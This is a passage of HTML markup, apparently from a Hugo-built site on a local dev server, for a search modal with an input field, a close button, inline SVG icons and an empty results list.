  class="invisible fixed inset-0 z-50 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
  data-url="http://localhost:1313/"
>
  <div
    id="search-modal"
    class="top-20 mx-auto flex min-h-0 w-full max-w-3xl flex-col rounded-md border border-neutral-200 bg-neutral shadow-lg dark:border-neutral-700 dark:bg-neutral-800"
  >
    <header class="relative z-10 flex flex-none items-center justify-between px-2">
      <form class="flex min-w-0 flex-auto items-center">
        <div class="flex h-8 w-8 items-center justify-center text-neutral-400">
          <span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
        </div>
        <input
          type="search"
          id="search-query"
          class="mx-1 flex h-12 flex-auto appearance-none bg-transparent focus:outline-dotted focus:outline-2 focus:outline-transparent"
          placeholder="Search"
          tabindex="0"
        />
      </form>
      <button
        id="close-search-button"
        class="flex h-8 w-8 items-center justify-center text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        title="Close (Esc)"
      >
        <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
</span>
      </button>
    </header>
    <section class="flex-auto overflow-auto px-2">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

    </div>
  </body>
</html>
